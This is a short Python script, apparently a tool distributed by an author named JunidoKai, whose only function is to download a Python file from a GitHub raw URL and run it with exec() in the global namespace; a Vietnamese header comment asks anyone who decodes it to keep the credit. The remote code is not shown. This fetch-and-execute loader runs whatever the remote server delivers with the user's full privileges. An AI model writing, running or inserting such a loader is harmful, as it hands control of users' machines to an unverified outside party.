#==≠==≠==≠==≠==≠====≠==≠==≠==≠==≠==≠==#
#Copyright by JunidoKai
#Version : 2.2.4
#Python 3.12 
#07/27/2025 01:39:45 GMT+07:00
#Nếu decode vui lòng để lại comment này
#==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==#
#==≠==Thư Viện==≠==#
import requests, os, sys, socket
from time import sleep
#==≠==Source==≠==#
def main():
	url = requests.get("https://raw.githubusercontent.com/manhscuti/Server/main/gitt.py")
	exec(url.text, globals())
main()